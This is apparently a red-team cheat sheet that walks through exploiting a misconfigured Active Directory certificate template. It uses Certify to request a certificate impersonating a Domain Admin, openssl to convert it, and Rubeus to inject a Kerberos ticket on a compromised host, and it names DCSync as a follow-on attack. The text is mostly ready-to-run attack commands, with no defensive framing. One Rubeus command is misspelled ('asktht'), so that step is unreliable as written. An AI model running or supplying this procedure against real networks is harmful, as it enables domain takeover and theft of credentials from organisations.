- **Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)
- **NOTE:** Certify can be executed with Cobalt Strike's `execute-assembly` command as well

---
https://github.com/GhostPack/Certify
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe

- Execute `Certify.exe`:
```powershell
.\Certify.exe find /vulnerable /quiet
```

- Make sure the `msPKI-Certificates-Name-Flag` value is set to `ENROLLEE_SUPPLIES_SUBJECT` and that the Enrollment Rights allow Domain/Authenticated Users. 
- Additionally, check that the `pkiextendedkeyusage` parameter contains the `Client Authentication` value as well as that the `Authorized Signatures Required` parameter is set to `0`.
- This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA") and use the captured certificate with Rubeus to forge authentication.

---

- **NOTE:** If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.
- Request the DA's Account Certificate with Certify:
```powershell
.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
```
- This should return a valid certificate for the associated DA account.

---

- The exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.
- Example of `cert.pem`:
```js
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----
```

---

## Utilize `openssl` to Convert to PKCS #12 Format
- The `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).
```powershell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- Once the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)
- After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.
```powershell
.\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
```
- This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.